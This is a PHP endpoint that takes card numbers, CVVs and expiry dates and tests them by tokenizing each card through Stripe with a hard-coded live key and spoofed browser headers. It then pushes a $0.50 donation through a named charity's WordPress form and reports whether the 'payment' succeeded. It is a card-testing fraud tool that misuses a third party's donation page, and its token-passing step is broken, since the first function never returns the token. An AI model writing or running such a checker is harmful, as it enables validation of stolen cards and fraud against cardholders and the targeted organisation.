<?php

include "../../server/authcontrol.php";

if (!isset($_POST)) {
    die(json_encode(array(
        "status" => "error",
        "message" => "unknown request method"
    )));
} else {
    if (!isset($_POST["cc"]) || !isset($_POST["cvv"]) || !isset($_POST["month"]) || !isset($_POST["year"])) {
        die(json_encode(array(
            "status" => "error",
            "message" => "missing parameters"
        )));
    } else {
        if (intval($_POST["month"]) < 1 || intval($_POST["month"]) > 12) {
            die(json_encode(array(
                "status" => "error",
                "message" => "invalid month"
            )));
        } else {
            if (intval($_POST["year"]) < date("Y") || intval($_POST["year"]) > date("Y") + 10) {
                die(json_encode(array(
                    "status" => "error",
                    "message" => "invalid year"
                )));
            } else {
                if (strlen($_POST["cc"]) != 16) {
                    die(json_encode(array(
                        "status" => "error",
                        "message" => "invalid card number"
                    )));
                } else {
                    if (strlen($_POST["cvv"]) != 3) {
                        die(json_encode(array(
                            "status" => "error",
                            "message" => "invalid cvv"
                        )));
                    } else {
                        $card = array(
                            'cc' => $_POST['cc'],
                            'month' => $_POST['month'],
                            'year' => $_POST['year'],
                            'cvv' => $_POST['cvv'],
                        );

                        function step1($card)
                        {
                            $cc = htmlspecialchars(trim($card["cc"]));
                            $cvv = htmlspecialchars(trim($card["cvv"]));
                            $month = htmlspecialchars(trim($card["month"]));
                            $year = htmlspecialchars(trim($card["year"]));

                            $query = http_build_query(array(
                                'time_on_page' => '47265',
                                'guid' => '6dd83e2a-bae3-4a0e-a813-d8ad42941c767af6bc',
                                'muid' => 'fa8abf16-1579-433e-ab2f-640d6baf329ec1da40',
                                'sid' => '6d1a6ccb-3715-4127-b174-4fce7b73d1c6e65531',
                                'key' => 'pk_live_yHVheeNNUSBCbOVSFSGqRXqZ',
                                'payment_user_agent' => 'stripe.js%2F78ef418',
                                'card[name]' => 'daphy qalis',
                                'card[number]' => $cc,
                                'card[exp_month]' => $month,
                                'card[exp_year]' => $year,
                                'card[cvc]' => $cvv
                            ));

                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
                            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                'authority: api.stripe.com',
                                'method: POST',
                                'path: /v1/tokens',
                                'scheme: https',
                                'accept: application/json',
                                'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
                                'content-type: application/x-www-form-urlencoded',
                                'origin: https://js.stripe.com',
                                'referer: https://js.stripe.com/',
                                'sec-fetch-dest: empty',
                                'sec-fetch-mode: cors',
                                'sec-fetch-site: same-site',
                                'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                            ));

                            $result = curl_exec($ch);
                            curl_close($ch);
                        }

                        function step2($id)
                        {
                            $query = http_build_query(array(
                                'action' => 'wp_full_stripe_payment_charge',
                                'formName' => 'MakeADonation',
                                'fullstripe_name' => 'daphy+qalis',
                                'fullstripe_email' => 'prismax5340@gmail.com',
                                'fullstripe_custom_amount' => '0.50',
                                'stripeToken' => $id
                            ));

                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, 'https://sonl.org/wp-admin/admin-ajax.php');
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
                            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                'authority: sonl.org',
                                'method: POST',
                                'path: /wp-admin/admin-ajax.php',
                                'scheme: https',
                                'accept: application/json',
                                'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
                                'content-type: application/x-www-form-urlencoded',
                                'origin: https://sonl.org',
                                'referer: https://sonl.org/donate/',
                                'sec-fetch-dest: empty',
                                'sec-fetch-mode: cors',
                                'sec-fetch-site: same-site',
                                'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                            ));

                            $result = curl_exec($ch);
                            curl_close($ch);

                            $array = json_decode($result, true);
                            return $array["success"];
                        }

                        $id = step1($card);
                        $result = step2($id);

                        if ($result == false) {
                            die(json_encode(array(
                                "status" => "error",
                                "message" => "payment failed"
                            )));
                        } else if ($result == true) {
                            die(json_encode(array(
                                "status" => "success",
                                "message" => "payment success"
                            )));
                        } else {
                            die(json_encode(array(
                                "status" => "warning",
                                "message" => "unknown error"
                            )));
                        }
                    }
                }
            }
        }
    }
}